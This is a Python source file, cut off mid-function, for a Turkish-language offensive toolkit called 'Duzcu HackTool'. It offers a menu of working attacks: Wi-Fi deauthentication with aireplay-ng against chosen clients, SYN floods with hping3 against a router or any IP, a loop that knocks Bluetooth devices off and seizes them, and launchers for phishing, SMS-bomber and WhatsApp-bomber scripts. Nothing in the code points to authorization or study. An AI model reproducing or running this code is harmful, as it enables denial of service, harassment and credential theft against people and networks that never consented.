from colorama import Fore, Style 

import subprocess
import time
import os
import socket
import sys
import importlib.util
import re  

import subprocess

def clear():
    subprocess.run("clear", shell=True)
    
def wifi_kartlarini_bul_ve_sec():
    global monitor_mod_karti

    try:
        cikti = subprocess.check_output("iwconfig", shell=True).decode(errors="ignore")
    except Exception:
        sprint(Fore.RED + "[!] Wi-Fi kartları tespit edilemedi!" + Style.RESET_ALL)
        time.sleep(2)
        return None

    kartlar = []

    for satir in cikti.splitlines():
        if "IEEE 802.11" in satir or satir.startswith("wlan"):
            arayuz = satir.split()[0]
            if arayuz not in kartlar:
                kartlar.append(arayuz)

    if not kartlar:
        sprint(Fore.RED + "[!] Wi-Fi kartı bulunamadı!" + Style.RESET_ALL)
        time.sleep(2)
        return None

    
    if len(kartlar) == 1:
        monitor_mod_karti = kartlar[0]
        sprint(Fore.GREEN + f"[✓] Wi-Fi kartı otomatik seçildi: {monitor_mod_karti}" + Style.RESET_ALL)
        time.sleep(2)
        return monitor_mod_karti

    
    clear()
    sprint(Fore.YELLOW + "[!] Birden fazla Wi-Fi kartı tespit edildi!" + Style.RESET_ALL)
    print()

    for i, kart in enumerate(kartlar, 1):
        print(Fore.WHITE + f"{i}) {kart}" + Style.RESET_ALL)

    while True:
        secim = input(Fore.CYAN + "\nKullanılacak Wi-Fi kart numarasını seç: " + Style.RESET_ALL)
        if not secim.isdigit():
            continue

        secim = int(secim)
        if 1 <= secim <= len(kartlar):
            monitor_mod_karti = kartlar[secim - 1]
            sprint(Fore.GREEN + f"[✓] Seçilen Wi-Fi kartı: {monitor_mod_karti}" + Style.RESET_ALL)
            time.sleep(2)
            return monitor_mod_karti
        
def sprint(text, second=0.05):
    
    ansi_escape_pattern = re.compile(r'(\x1b\[[0-9;]*m)')
    
    
    parts = ansi_escape_pattern.split(text)
    
    for part in parts:
        if part:
            if re.match(ansi_escape_pattern, part):
                
                sys.stdout.write(part)
                sys.stdout.flush()
            else:
                
                for char in part:
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    time.sleep(second)
    
    
    sys.stdout.write('\n')
    sys.stdout.flush()
    
def wifi_kartlari_ve_monitor_modu_bul():
    try:
        cikti = subprocess.check_output("iwconfig", shell=True).decode(errors="ignore")
        wifi_kartlari = []
        monitor_mod_karti = None
        for satir in cikti.splitlines():
            if "no wireless extensions" in satir.lower():
                continue
            if "IEEE 802.11" in satir or "wlan" in satir:
                arayuz_adi = satir.split()[0]
                wifi_kartlari.append(arayuz_adi)
                if "Mode:Monitor" in satir:
                    monitor_mod_karti = arayuz_adi
        if not monitor_mod_karti and wifi_kartlari:
            monitor_mod_karti = wifi_kartlari[0]
        return wifi_kartlari, monitor_mod_karti
    except Exception:
        return [], None

def check_dependencies():
    clear()
    requirements_file = "requirements.txt" 
    if not os.path.exists(requirements_file):
        print(Fore.RED + f"Hata: '{requirements_file}' dosyası bulunamadı." + Style.RESET_ALL)
        print(Fore.RED + "Lütfen 'requirements.txt' dosyasının script ile aynı dizinde olduğundan emin olun." + Style.RESET_ALL)
        sys.exit(1)

    with open(requirements_file, 'r') as f:
        required_packages = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]

    missing_packages = []
    for package in required_packages:
        import_name = package.split('==')[0].split('>=')[0].split('<=')[0].split('~=')[0]
        if import_name == "beautifulsoup4":
            import_name = "bs4"
        elif import_name == "python-requests":
            import_name = "requests"
        
        spec = importlib.util.find_spec(import_name)
        if spec is None:
            missing_packages.append(package)

    if missing_packages:
        print(Fore.RED + "[HATA] Eksik kütüphaneler tespit edildi!" + Style.RESET_ALL)
        print(Fore.YELLOW + "Lütfen aşağıdaki kütüphaneleri yükleyin:" + Style.RESET_ALL)
        for pkg in missing_packages:
            print(Fore.YELLOW + f"  - {pkg}" + Style.RESET_ALL)
        sprint(Fore.GREEN + "Tüm eksik kütüphaneleri yüklemek için aşağıdaki komutu çalıştırın:" + Style.RESET_ALL)
        sprint(Fore.LIGHTMAGENTA_EX + f"pip3 install -r {requirements_file}" + Style.RESET_ALL)
        sys.exit(1)
    else:
        print(Fore.CYAN + "Gerekli kütüphaneler kontrol ediliyor..." + Style.RESET_ALL)
        print(Fore.GREEN + "Tüm gerekli kütüphaneler yüklü." + Style.RESET_ALL)

def run_cmd(cmd):
    try:
        subprocess.run(cmd, shell=True, check=True,
                       stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL,
                       stdin=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        pass
        
def monitor_mode_ac():
    global monitor_mod_karti

    clear()
    sprint(Fore.CYAN + f"[!] Kilitlenen Wi-Fi kartı: {monitor_mod_karti}" + Style.RESET_ALL)
    sprint(Fore.YELLOW + "[*] Monitor moda geçiliyor..." + Style.RESET_ALL)

    run_cmd("airmon-ng check kill")
    run_cmd("nmcli networking off")
    run_cmd("rfkill unblock all")
    run_cmd("systemctl stop NetworkManager.service || true")
    run_cmd("systemctl stop wpa_supplicant.service || true")

    run_cmd(f"airmon-ng start {monitor_mod_karti}")
    time.sleep(2)

    sprint(Fore.GREEN + f"[+] Monitor moda geçildi (Kilitli kart: {monitor_mod_karti})." + Style.RESET_ALL)
    time.sleep(2)


def aglari_tar(sure=30, monitor_mod_karti=None):
    if monitor_mod_karti is None:
        sprint(Fore.RED + "[!] Monitor mod kartı belirtilmedi!" + Style.RESET_ALL)
        return ''

    clear()
    print(Fore.YELLOW + f"[*] Ağlar {sure} saniye boyunca taranıyor ({monitor_mod_karti})..." + Style.RESET_ALL)

    dumpfile = "/tmp/aglar-01.csv"
    if os.path.exists(dumpfile):
        os.remove(dumpfile)

    proc = subprocess.Popen(
        f"airodump-ng --output-format csv -w /tmp/aglar {monitor_mod_karti}",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL
    )
    time.sleep(sure)
    proc.terminate()
    proc.wait()

    print(Fore.GREEN + "[+] Tarama tamamlandı." + Style.RESET_ALL)
    time.sleep(1)

    try:
        with open(dumpfile, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    except FileNotFoundError:
        return ''

def aglari_ayikla(csv_veri):
    aglar = []
    satirlar = csv_veri.splitlines()
    parsing = False
    for satir in satirlar:
        if 'BSSID' in satir and 'ESSID' in satir:
            parsing = True
            continue
        if parsing:
            if satir.startswith('Station MAC') or satir.strip() == '':
                break
            parcala = satir.split(',')
            if len(parcala) >= 14:
                bssid = parcala[0].strip()
                kanal = parcala[3].strip()
                essid = parcala[13].strip()
                aglar.append({'bssid': bssid, 'channel': kanal, 'essid': essid})
    return aglar

def cihazlari_tar(bssid, kanal, sure=30, monitor_mod_karti=None):
    if monitor_mod_karti is None:
        print(Fore.RED + "[!] Monitor mod kartı belirtilmedi!" + Style.RESET_ALL)
        return []

    clear()
    print(Fore.YELLOW + f"[*] Cihazlar {sure} saniye boyunca taranıyor ({monitor_mod_karti})..." + Style.RESET_ALL)

    dumpfile = "/tmp/cihazlar-01.csv"
    if os.path.exists(dumpfile):
        os.remove(dumpfile)

    cmd = f"airodump-ng --bssid {bssid} -c {kanal} --output-format csv -w /tmp/cihazlar {monitor_mod_karti}"
    proc = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL
    )
    time.sleep(sure)
    proc.terminate()
    proc.wait()

    cihazlar = []
    try:
        with open(dumpfile, "r", encoding="utf-8", errors="ignore") as f:
            satirlar = f.readlines()
        start = False
        for s in satirlar:
            if 'Station MAC' in s:
                start = True
                continue
            if start and s.strip():
                parcala = s.strip().split(',')
                if len(parcala) >= 1:
                    cihazlar.append(parcala[0].strip())
    except FileNotFoundError:
        pass
    return cihazlar

import threading

def deauth_hedef_saldir(bssid, hedef, paket_sayisi, monitor_mod_karti):
    print(Fore.WHITE + f" -> {hedef} adresine saldırı başlatıldı..." + Style.RESET_ALL)

    if paket_sayisi == 0:
        cmd = f"aireplay-ng --deauth 0 -a {bssid} -c {hedef} {monitor_mod_karti}"
    else:
        cmd = f"aireplay-ng --deauth {paket_sayisi} -a {bssid} -c {hedef} {monitor_mod_karti}"

    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in proc.stdout:
        print(Fore.WHITE + f"[{hedef}] {line.strip()}" + Style.RESET_ALL)
    proc.wait()

    print(Fore.WHITE + f" -> {hedef} adresine saldırı tamamlandı." + Style.RESET_ALL)

def deauth_saldir(bssid, hedefler, paket_sayisi, monitor_mod_karti):
    clear()
    print(Fore.YELLOW + f"[*] Saldırı başlatılıyor: {len(hedefler)} hedef, Paket sayısı: {paket_sayisi if paket_sayisi != 0 else 'Sınırsız'}" + Style.RESET_ALL)

    thread_list = []
    for hedef in hedefler:
        t = threading.Thread(target=deauth_hedef_saldir, args=(bssid, hedef, paket_sayisi, monitor_mod_karti))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()

    sprint(Fore.GREEN + "[+] Tüm saldırılar tamamlandı." + Style.RESET_ALL)
    time.sleep(3)

def input_int(prompt, min_val=None, max_val=None):
    while True:
        val = input(prompt)
        if not val.isdigit():
            sprint(Fore.WHITE + "Lütfen sayı gir." + Style.RESET_ALL)
            continue
        val = int(val)
        if (min_val is not None and val < min_val) or (max_val is not None and val > max_val):
            sprint(Fore.WHITE + f"Lütfen {min_val} ile {max_val} arasında sayı gir." + Style.RESET_ALL)
            continue
        return val

def get_gateway_ip():
    
    try:
        route = subprocess.check_output("ip route show default", shell=True).decode()
        gateway = route.split()[2]
        return gateway
    except Exception:
        return None

def port_tarama(ip, portlar=[80, 443, 8080, 22, 23, 21, 53, 3389]):
    sprint(Fore.YELLOW + f"[*] {ip} adresinde portlar taranıyor..." + Style.RESET_ALL)
    acik_portlar = []
    for port in portlar:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        try:
            result = sock.connect_ex((ip, port))
            if result == 0:
                acik_portlar.append(port)
        except Exception:
            pass
        finally:
            sock.close()
    return acik_portlar

def flood_saldir(ip, port, paket_sayisi):
    sprint(Fore.YELLOW + f"[*] {ip}:{port} adresine flood saldırısı başlatılıyor. Paket sayısı: {paket_sayisi}" + Style.RESET_ALL)
    if paket_sayisi == 0:
        paket_sayisi = ""  
    else:
        paket_sayisi = f"-c {paket_sayisi}"
    cmd = f"hping3 {paket_sayisi} -S -p {port} --flood {ip}"
    subprocess.run(cmd, shell=True)

def ip_modem_saldiri_menu():
    clear()
    sprint(Fore.CYAN + "=== Flood Saldırı Seçimi ===" + Style.RESET_ALL)
    sprint(Fore.WHITE + "1) WiFi Flood Saldırısı (Modeme)" + Style.RESET_ALL)
    sprint(Fore.WHITE + "2) IP Adresine Flood Saldırısı" + Style.RESET_ALL)
    sprint(Fore.WHITE + "3) Geri Dön" + Style.RESET_ALL)
    secim = input_int(Fore.MAGENTA + "Seçimin: " + Style.RESET_ALL, 1, 3)

    if secim == 1:
        aglar = aglari_ayikla(aglari_tar())
        if not aglar:
            sprint(Fore.RED + "[!] Ağ bulunamadı. Menüye dönülüyor..." + Style.RESET_ALL)
            time.sleep(2)
            return

        print(Fore.CYAN + "\n--- Taranan Ağlar ---" + Style.RESET_ALL)
        for i, ag in enumerate(aglar, 1):
            print(Fore.WHITE + f"{i}. ESSID: {ag['essid']} | BSSID: {ag['bssid']} | Kanal: {ag['channel']}" + Style.RESET_ALL)

        secim_ag = input_int(Fore.BLUE + "\nHedef ağ numarasını seç: " + Style.RESET_ALL, 1, len(aglar))
        secilen_ag = aglar[secim_ag - 1]

        gateway_ip = get_gateway_ip()
        if not gateway_ip:
            sprint(Fore.RED + "[!] Gateway IP alınamadı. Menüye dönülüyor..." + Style.RESET_ALL)
            time.sleep(2)
            return

        sprint(Fore.WHITE + f"Seçilen ağın gateway IP'si: {gateway_ip}" + Style.RESET_ALL)

        acik_portlar = port_tarama(gateway_ip)
        if not acik_portlar:
            sprint(Fore.RED + "[!] Açık port bulunamadı. Menüye dönülüyor..." + Style.RESET_ALL)
            time.sleep(2)
            return

        sprint(Fore.WHITE + f"Açık portlar bulundu: {acik_portlar}" + Style.RESET_ALL)
        cevap = input(Fore.CYAN + "Saldırı yapılsın mı? (e/h): " + Style.RESET_ALL).lower()
        if cevap != 'e':
            sprint(Fore.CYAN + "Saldırı iptal edildi. Menüye dönülüyor..." + Style.RESET_ALL)
            time.sleep(2)
            return

        port_secim = input_int(Fore.BLUE + "Hangi portu hedefleyelim? Seçiniz: " + Style.RESET_ALL, min_val=min(acik_portlar), max_val=max(acik_portlar))
        paket_sayisi = input_int(Fore.BLUE + "Kaç paket gönderilsin? (0 sınırsız): " + Style.RESET_ALL, 0)

        flood_saldir(gateway_ip, port_secim, paket_sayisi)

    elif secim == 2:
        ip = input(Fore.CYAN + "Hedef IP adresini gir: " + Style.RESET_ALL)
        acik_portlar = port_tarama(ip)
        if not acik_portlar:
            sprint(Fore.RED + "[!] Açık port bulunamadı. Menüye dönülüyor..." + Style.RESET_ALL)
            time.sleep(2)
            return

        sprint(Fore.WHITE + f"Açık portlar bulundu: {acik_portlar}" + Style.RESET_ALL)
        cevap = input(Fore.CYAN + "Saldırı yapılsın mı? (e/h): " + Style.RESET_ALL).lower()
        if cevap != 'e':
            sprint(Fore.CYAN + "Saldırı iptal edildi. Menüye dönülüyor..." + Style.RESET_ALL)
            time.sleep(2)
            return

        port_secim = input_int(Fore.BLUE + "Hangi portu hedefleyelim? Seçiniz: " + Style.RESET_ALL, min_val=min(acik_portlar), max_val=max(acik_portlar))
        paket_sayisi = input_int(Fore.BLUE + "Kaç paket gönderilsin? (0 sınırsız): " + Style.RESET_ALL, 0)

        flood_saldir(ip, port_secim, paket_sayisi)

    else:
        sprint(Fore.WHITE + "Geri dönülüyor..." + Style.RESET_ALL)
        time.sleep(1)
        return
        
def osint_menu():
    import webbrowser
    import shutil
    import time

    clear()
    sprint(Fore.RED + "[!] ⚠️ Eğer Siteler Açılmazsa Rootsuz Çalıştırıp Kullanmanız Lazım |Python3 hack_menusu.py| " + Style.RESET_ALL) 
    time.sleep(5)
    clear()

    firefox_path = shutil.which("firefox")
    if firefox_path:
        webbrowser.register('firefox', None, webbrowser.BackgroundBrowser(firefox_path))
        browser = webbrowser.get('firefox')
    else:
        sprint(Fore.RED + "🚫 Firefox bulunamadı. Lütfen sistemine kurulu olduğundan emin ol." + Style.RESET_ALL) 
        time.sleep(3)
        return

    sprint(Fore.WHITE + "=== Web OSINT Arama Menüsü === 🔍" + Style.RESET_ALL) 

    
    print(Fore.RED + """
 ██████╗     ███████╗    ██╗    ███╗   ██╗    ████████╗    ███████╗
██╔═══██╗    ██╔════╝    ██║    ████╗  ██║    ╚══██╔══╝    ██╔════╝
██║   ██║    ███████╗    ██║    ██╔██╗ ██║       ██║       ███████╗
██║   ██║    ╚════██║    ██║    ██║╚██╗██║       ██║       ╚════██║
╚██████╔╝    ███████║    ██║    ██║ ╚████║       ██║       ███████║
 ╚═════╝     ╚══════╝    ╚═╝    ╚═╝  ╚═══╝       ╚═╝       ╚══════╝
""" + Style.RESET_ALL)

    sorgu = input(Fore.CYAN + "🔎 Aranacak isim veya cümleyi gir: " + Style.RESET_ALL) 
    saniye = input_int(Fore.CYAN + "⏳ Kaç saniye arama yapılsın?: " + Style.RESET_ALL, 5)

    sprint(Fore.YELLOW + f"\n[*] {saniye} saniye boyunca Google'da '{sorgu}' aranıyor...\n" + Style.RESET_ALL) 
    sprint(Fore.YELLOW + "🌐 Sayfalar açılıyor, lütfen bekleyin... ⏳" + Style.RESET_ALL) 

    start_time = time.time()
    sayfalar = [
        "https://www.google.com/search?q=" + sorgu,
        "https://www.facebook.com/search/top?q=" + sorgu,
        "https://www.instagram.com/" + sorgu.replace(" ", ""),
        "https://twitter.com/search?q=" + sorgu,
        "https://www.youtube.com/results?search_query=" + sorgu,
    ]

    bulunanlar = []

    for url in sayfalar:
        if time.time() - start_time >= saniye:
            break
        bulunanlar.append(url)
        time.sleep(1)

    sprint(Fore.GREEN + "\n[*] ✅ Arama tamamlandı! Bulunan sayfalar:\n" + Style.RESET_ALL) 
    for i, link in enumerate(bulunanlar, 1):
        print(Fore.WHITE + f"🔗 {i}- {link}" + Style.RESET_ALL)

    sprint(Fore.MAGENTA + "0- Tümünü aynı tarayıcıda sekme olarak aç" + Style.RESET_ALL) 

    secim = input_int(Fore.BLUE + "\n❓ Hangi link açılsın? (0 hepsi): " + Style.RESET_ALL, 0, len(bulunanlar))

    if secim == 0:
        sprint(Fore.GREEN + "✨ Tüm sayfalar sekme olarak açılıyor..." + Style.RESET_ALL) 
        browser.open_new(bulunanlar[0])
        for link in bulunanlar[1:]:
            browser.open_new_tab(link)
    else:
        sprint(Fore.GREEN + f"✨ Seçilen link ({secim}) açılıyor..." + Style.RESET_ALL) 
        browser.open_new(bulunanlar[secim - 1])

    sprint(Fore.YELLOW + "Devam etmek için bir tuşa basın... ↩️" + Style.RESET_ALL) 
    time.sleep(2)

def wifi():
    clear()
    time.sleep(1)
    sprint(Fore.YELLOW + "[*] Monitor moddan çıkılıyor..." + Style.RESET_ALL)
    time.sleep(5)
    run_cmd("airmon-ng stop wlan0")
    sprint(Fore.YELLOW + "[*] Airmon-ng Başarılıyla Durduruldu" + Style.RESET_ALL)
    time.sleep(3)
    run_cmd("systemctl start NetworkManager.service")
    sprint(Fore.YELLOW + "[*] NetworkManager Başarılıyla Başlatıldı" + Style.RESET_ALL)
    time.sleep(3)
    run_cmd("systemctl start wpa_supplicant.service")
    sprint(Fore.YELLOW + "[*] Wpa Sistemi Başarılıyla Başlatıldı" + Style.RESET_ALL)
    time.sleep(3)
    run_cmd("nmcli networking on")
    sprint(Fore.YELLOW + "[*] İnternete Erişim Motoru Başarılı Şekilde Başlatıldı" + Style.RESET_ALL)
    time.sleep(3)
    run_cmd("ip link set wlan0 down")
    sprint(Fore.YELLOW + "[*] İp Adresi Başarılıyla Verildi" + Style.RESET_ALL)
    time.sleep(3)
    run_cmd("iwconfig wlan0 mode managed")
    sprint(Fore.YELLOW + "[*] Wlan0 Başarılıyla Yerleşti" + Style.RESET_ALL)
    time.sleep(3)
    run_cmd("ip link set wlan0 up")
    sprint(Fore.YELLOW + "[*] İp İnternete Çıkartıldı..." + Style.RESET_ALL)
    time.sleep(5)
    sprint(Fore.YELLOW + "[*] Wlan0 Mode:Managed Olarak Ayarlandı..." + Style.RESET_ALL)
    time.sleep(5)
    run_cmd("airmon-ng stop wlan0")
    run_cmd("nmcli networking on")
    run_cmd("rfkill unblock all")
    run_cmd("systemctl start NetworkManager.service")
    run_cmd("systemctl start wpa_supplicant.service")
    time.sleep(5)
    run_cmd("sudo nmcli networking on")
    clear()
    sprint(Fore.WHITE + "[✓] WiFi Artık Kullanılabilir!" + Style.RESET_ALL)
    time.sleep(3)
    return
    
def bluetooth_saldir():
    import subprocess
    import time
    import os
    
    subprocess.run("clear", shell=True)
    subprocess.run("bluetoothctl power on", shell=True)
    print(Fore.YELLOW + "[*] Bluetooth cihazlar 30 saniye boyunca taranıyor..." + Style.RESET_ALL)
    subprocess.run("bluetoothctl scan on &", shell=True)
    time.sleep(30)
    subprocess.run("bluetoothctl scan off", shell=True)

    sprint(Fore.WHITE + "\n--- Eşleşmiş Cihazlar Listeleniyor ---" + Style.RESET_ALL)
    cihazlar = subprocess.check_output("bluetoothctl devices", shell=True).decode().splitlines()
    if not cihazlar:
        print(Fore.RED + "[!] Cihaz bulunamadı!" + Style.RESET_ALL)
        time.sleep(2)
        return

    for i, cihaz in enumerate(cihazlar, 1):
        sprint(Fore.WHITE + f"{i}. {cihaz}" + Style.RESET_ALL)

    secim = int(input(Fore.BLUE + "\nHedef cihaz numarasını gir: " + Style.RESET_ALL)) 
    hedef_satir = cihazlar[secim - 1]
    hedef_mac = hedef_satir.split()[1]

    print(Fore.YELLOW + f"\n[*] Hedef cihaz: {hedef_mac}" + Style.RESET_ALL)
    print(Fore.YELLOW + "[*] Cihaz bağlantısı izleniyor ve düşürülmeye çalışılıyor..." + Style.RESET_ALL)

    while True:
        bagli_mi = subprocess.getoutput(f"bluetoothctl info {hedef_mac}")
        if "Connected: yes" in bagli_mi:
            print(Fore.RED + "[!] Cihaz bağlı durumda, bağlantı kesilmeye çalışılıyor..." + Style.RESET_ALL)
            subprocess.run(f"bluetoothctl disconnect {hedef_mac}", shell=True)
        else:
            sprint(Fore.GREEN + "[+] Cihaz boşta, bağlantı deneniyor..." + Style.RESET_ALL)
            subprocess.run(f"bluetoothctl connect {hedef_mac}", shell=True)
            time.sleep(2)
            yeni_durum = subprocess.getoutput(f"bluetoothctl info {hedef_mac}")
            if "Connected: yes" in yeni_durum:
                print(Fore.WHITE + "✅ Cihaza başarıyla bağlanıldı!" + Style.RESET_ALL)
                break
        time.sleep(3)
        
def phisher():
    """
    phisher.py scriptini çalıştırır
    """
    base = os.path.dirname(os.path.abspath(__file__))
    script_to_run = os.path.join(base, "Scripts", "phisher.py")
    subprocess.call([sys.executable, script_to_run])
        
def wbomb():
    """
    wbomb.py scriptini çalıştırır
    """
    base = os.path.dirname(os.path.abspath(__file__))
    script_to_run = os.path.join(base, "Scripts", "wbomb.py")
    subprocess.call([sys.executable, script_to_run])
        
def bsms():
    """
    sbomb.py scriptini çalıştırır.
    """
    script_to_run = "sbomb.py"
    subprocess.call([sys.executable, script_to_run])

def bmbmenu():
    clear()
    sprint("Whatsapp Bomber Çalışmazsa 'Python3 hack_menusu.py' sudo çalışmasını engellemektedir" + Style.RESET_ALL)
    time.sleep(1)
    print(f"{Fore.CYAN}╔═════════════════════════════════════════════╗" + Style.RESET_ALL)
    print(f"{Fore.CYAN}║{Fore.YELLOW}          💣 BOMBA SALDIRISI MENÜSÜ 💣       {Fore.CYAN}║" + Style.RESET_ALL)
    print(f"{Fore.CYAN}╠═════════════════════════════════════════════╣" + Style.RESET_ALL)
    print(f"{Fore.CYAN}║ {Fore.LIGHTBLUE_EX}1) ✉️ SMS Bomber                             {Fore.CYAN}║" + Style.RESET_ALL)
    print(f"{Fore.CYAN}║ {Fore.LIGHTGREEN_EX}2) 💬 WhatsApp Bomber (Linux, Firefox)      {Fore.CYAN}║" + Style.RESET_ALL)
    print(f"{Fore.CYAN}║ {Fore.LIGHTRED_EX}3) ↩️ Geri Dön                               {Fore.CYAN}║" + Style.RESET_ALL)
    print(f"{Fore.CYAN}╚═════════════════════════════════════════════╝" + Style.RESET_ALL)

    secim = input_int(Fore.MAGENTA + "Seçimin: " + Style.RESET_ALL, 1, 3)
    if secim == 1:
        bsms()
    elif secim == 2:
        wbomb()
    elif secim == 3:
        ana_menu()

def ana_menu():
    while True:
        clear()
        print(Fore.YELLOW + "Scripti kullandığın için teşekkür ederim")
        print(Fore.LIGHTGREEN_EX + "Lütfen GitHub üzerinden  yıldız vererek destek ol!")
        sprint(Fore.LIGHTGREEN_EX + "Menü Yükleniyor...") 
        time.sleep(1)
        clear()
        print(Fore.CYAN + """╔══════════════════════════════════╗      Sistem Uyumluluğu:
║       """ + Fore.YELLOW + "Duzcu HackTool" + Fore.CYAN + """             ║      ---""")
        print(Fore.CYAN + "║       Discord:" + Fore.LIGHTMAGENTA_EX + " .El.Pipi." + Fore.CYAN + "         ║     " + Fore.YELLOW + "**Kali Linux:**")
        print(Fore.CYAN + "║       İnstagram:" + Fore.LIGHTMAGENTA_EX + " Duzcu480" + Fore.CYAN + "        ║     " + Fore.GREEN + " * Cihaza Deauth Saldırısı: Tamamen çalışır.")
        print(Fore.CYAN + "║                                  ║     " + Fore.GREEN + " * Modeme/IP Flood Saldırısı: Tamamen çalışır.")
        print(Fore.CYAN + "╠══════════════════════════════════╣     " + Fore.GREEN + " * OSINT Google Arama: Tamamen çalışır.")
        print(Fore.CYAN + "║ " + Fore.YELLOW + "1) 📡 Cihaza Deauth Saldırısı" + Fore.CYAN + "    ║     " + Fore.GREEN + " * WiFi Bağlanma (Mode Managed): Tamamen çalışır.")
        print(Fore.CYAN + "║ " + Fore.YELLOW + "2) 🌐 Modem / IP Flood ." + Fore.CYAN + "         ║      ---")
        print(Fore.CYAN + "║ " + Fore.YELLOW + "3) 🔍 OSINT Google Arama" + Fore.CYAN + "         ║     " + Fore.LIGHTRED_EX + "**Parrot" + Fore.BLUE + " OS:**")
        print(Fore.CYAN + "║ " + Fore.YELLOW + "4) 📶 WiFi Bağlanma(Mode Managed)" + Fore.CYAN + "║     " + Fore.LIGHTGREEN_EX + " * Cihaza Deauth Saldırısı: Tamamen çalışır.")
        print(Fore.CYAN + "║ " + Fore.YELLOW + "5) 🕵️  Bluetooth Sızma" + Fore.CYAN + "            ║     " + Fore.LIGHTGREEN_EX + " * Modeme/IP Flood Saldırısı: Tamamen çalışır.")
        print(Fore.CYAN + "║ " + Fore.YELLOW + "6) 💣 Bombalar                   " + Fore.CYAN + "║     " + Fore.LIGHTGREEN_EX + " * OSINT Google Arama: Tamamen çalışır.")
        print(Fore.CYAN + "║ " + Fore.YELLOW + "7) 📚 Phishing Saldırısı         " + Fore.CYAN + "║     " + Fore.LIGHTGREEN_EX + " * WiFi Bağlanma (Mode Managed): Tamamen çalışır.")
        print(Fore.CYAN + "║ " + Fore.LIGHTRED_EX + "8) ↩️ Çıkış                       " + Fore.CYAN + "║")
        print(Fore.CYAN + "╚══════════════════════════════════╝      ---")
        print("                                         " + Fore.LIGHTYELLOW_EX + "**Ubuntu" + Fore.CYAN + " (Mint, Debian dahil):**")
        print("                                         " + Fore.MAGENTA + " * Cihaza Deauth Saldırısı: Kurulum sonrası çalışır.")
        print("                                         " + Fore.MAGENTA + " * Modeme/IP Flood Saldırısı: Kurulum sonrası çalışır.")
        print("                                         " + Fore.MAGENTA + " * OSINT Google Arama: Tamamen çalışır.")
        print("                                         " + Fore.MAGENTA + " * WiFi Bağlanma (Mode Managed): Tamamen çalışır.")
        print("                                         " + Fore.MAGENTA + " * Bluetooth Sızma : Tamamen çalışır.")
        print("                                          ---")
        print("                                         " + Fore.BLUE + "**Fedora" + Fore.LIGHTRED_EX + " (CentOS, RHEL dahil):**")
        print("                                         " + Fore.YELLOW + " * Cihaza Deauth Saldırısı: Kurulum sonrası çalışır.")
        print("                                         " + Fore.YELLOW + " * Modeme/IP Flood Saldırısı: Kurulum sonrası çalışır.")
        print("                                         " + Fore.YELLOW + " * OSINT Google Arama: Tamamen çalışır.")
        print("                                         " + Fore.YELLOW + " * WiFi Bağlanma (Mode Managed): Tamamen çalışır.")
        print("                                         " + Fore.YELLOW + " * Bluetooth Sızma : Tamamen çalışır.")
        print("                                          ---")
        print("                                         " + Fore.LIGHTMAGENTA_EX + "**Arch" + Fore.CYAN + " Linux (Manjaro dahil):**")
        print("                                         " + Fore.WHITE + " * Cihaza Deauth Saldırısı: Kurulum sonrası çalışır.")
        print("                                         " + Fore.WHITE + " * Modeme/IP Flood Saldırısı: Kurulum sonrası çalışır.")
        print("                                         " + Fore.WHITE + " * OSINT Google Arama: Tamamen çalışır.")
        print("                                         " + Fore.WHITE + " * WiFi Bağlanma (Mode Managed): Tamamen çalışır.")
        print("                                         " + Fore.WHITE + " * Bluetooth Sızma : Kurulum sonrası çalışır.")
        print("                                          ---")
        print("                                         " + Fore.CYAN + "**Alpine Linux:**")
        print("                                         " + Fore.LIGHTRED_EX + " * Cihaza Deauth Saldırısı: Kurulumu zorlu, genellikle çalışmaz.")
        print("                                         " + Fore.LIGHTRED_EX + " * Modeme/IP Flood Saldırısı: Kurulumu zorlu, genellikle çalışmaz.")
        print("                                         " + Fore.LIGHTRED_EX + " * OSINT Google Arama: Çalışır.")
        print("                                         " + Fore.LIGHTRED_EX + " * WiFi Bağlanma (Mode Managed): Çalışmaz, komutlar farklı.")
        print("                                         " + Fore.LIGHTRED_EX + " * Bluetooth Sızma : Kurulumu zorlu, genellikle çalışmaz.")
        print(Fore.YELLOW + f"Kullanıcı Wi-Fi kartı : {monitor_mod_karti}" + Style.RESET_ALL)
        print("                                         " + Fore.RED + "**Önemli Not:** " + Fore.YELLOW + "Deauth ve Flood saldırıları için Root yetkisi lazımdır, lütfen " + Fore.GREEN + " 'sudo hack_menusu.py' " + Fore.YELLOW + " olarak başlatın**")

        secim = input_int(Fore.MAGENTA + "Seçimin: ", 1, 8)
        if secim == 1:
            deauth_menu()
        elif secim == 2:
            ip_modem_saldiri_menu()
        elif secim == 3:
            osint_menu()
        elif secim == 4:
            wifi()
        elif secim == 5:
            bluetooth_saldir()
        elif secim == 6:
            bmbmenu()
        elif secim == 7:
            phisher()
        elif secim == 8:
            sprint(Fore.WHITE + "Çıkış yapılıyor...")
            break

def deauth_menu():
    global monitor_mod_karti
    monitor_mode_ac()

    if not monitor_mod_karti:
        sprint(Fore.RED + "[!] Monitor mod kartı bulunamadı. Menüye dönülüyor..." + Style.RESET_ALL)
        time.sleep(2)
        return

    aglar = aglari_ayikla(aglari_tar(monitor_mod_karti=monitor_mod_karti))
    if not aglar:
        print(Fore.RED + "[!] Ağ bulunamadı. Menüye dönülüyor..." + Style.RESET_ALL)
        time.sleep(2)
        return

    print(Fore.CYAN + "\n--- Taranan Ağlar ---" + Style.RESET_ALL)
    for i, ag in enumerate(aglar, 1):
        print(Fore.WHITE + f"{i}. ESSID: {ag['essid']} | BSSID: {ag['bssid']} | Kanal: {ag['channel']}" + Style.RESET_ALL)

    secim = input_int(Fore.BLUE + "\nSaldırılacak ağ numarası: " + Style.RESET_ALL, 1, len(aglar))
    secilen_ag = aglar[secim - 1]

    cihazlar = cihazlari_tar(secilen_ag['bssid'], secilen_ag['channel'], monitor_mod_karti=monitor_mod_karti)
    if not cihazlar:
